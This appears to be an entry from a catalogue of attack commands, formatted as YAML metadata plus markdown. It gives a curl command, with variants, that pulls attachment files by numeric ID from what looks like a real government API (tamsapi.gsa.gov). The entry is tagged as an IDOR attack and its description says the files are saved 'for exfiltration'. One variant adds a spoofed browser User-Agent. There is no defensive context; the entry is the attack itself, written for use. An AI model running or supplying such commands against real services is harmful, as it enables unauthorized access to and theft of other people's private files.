---
data: >-
  curl -X GET
  "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600"
  --output attachment.bin
tags:
  - api
  - download
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.366Z'
id: d783e542-356a-4d3e-8f9a-942e9c86f663
verified: false
validated: true
submitted: true
---
# curl-retrieve-attachment

## Command

```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600" --output attachment.bin
```

## Description

Fetches binary attachment data from the TAMS API using an attachment ID, saving it to a file for exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| URL with ID | Endpoint with numeric ATTACHMENT_ID (e.g., 600) | Yes |
| `--output attachment.bin` | Saves response to file | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600" > attachment.bin
```

### With Headers

```bash
curl -X GET "https://tamsapi.gsa.gov/user/tams/api/usermgmnt/getAttachmentBytes/600" -H "User-Agent: Mozilla/5.0" -o attachment.bin
```

## Expected Output

Binary file (e.g., PDF or image) saved as attachment.bin; use `file attachment.bin` to verify type.

## Related

- [[Related Procedure]]
